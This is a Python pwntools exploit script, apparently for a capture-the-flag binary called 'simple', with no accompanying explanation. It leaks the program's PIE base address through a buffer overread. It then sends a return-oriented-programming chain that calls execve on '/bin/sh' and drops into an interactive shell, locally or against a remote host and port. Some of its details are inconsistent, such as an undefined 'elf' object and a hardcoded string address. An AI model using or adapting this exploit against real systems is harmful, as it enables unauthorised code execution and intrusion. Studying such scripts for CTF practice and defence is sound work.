#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'simple')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
piebase
breakrva 0x097f
continue
'''.format(**locals())

filterwarnings("ignore")
context.log_level = "debug"

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

def leak():
    payload = ' '*57 + '/bin/sh'
    io.send(payload)
    io.recvuntil('/bin/sh')
    leak = unpack(io.recv(6).ljust(8, b'\x00'))
    elf.address = leak - exe.sym['notcalled']
    info("elf base address: %#x", elf.address)

def rop():
    offset = 88
    pop_rdi = elf.address + 0x000000000000082f # pop rdi; ret; 
    xor_rsi = elf.address + 0x0000000000000831 # xor rsi, rsi; ret; 
    xor_rdx = elf.address + 0x0000000000000835 # xor rdx, rdx; ret; 
    pop_rax = elf.address + 0x000000000000082d # pop rax; ret; 
    syscall = elf.address + 0x000000000000082a # syscall; 
    sh = 0x999999039

    info("pop rax: %#x", pop_rax)
    info("pop rdi: %#x", pop_rdi)
    info("xor rsi: %#x", xor_rsi)
    info("xor rdx: %#x", xor_rdx)
    info("syscall: %#x", syscall)
    
    payload = flat({
        offset: [
            pop_rax,
            0x3b,
            pop_rdi,
            sh,
            xor_rsi,
            xor_rdx,
            syscall
        ]
    })

    io.sendline(payload)

io = start()

leak()
rop()

io.interactive()
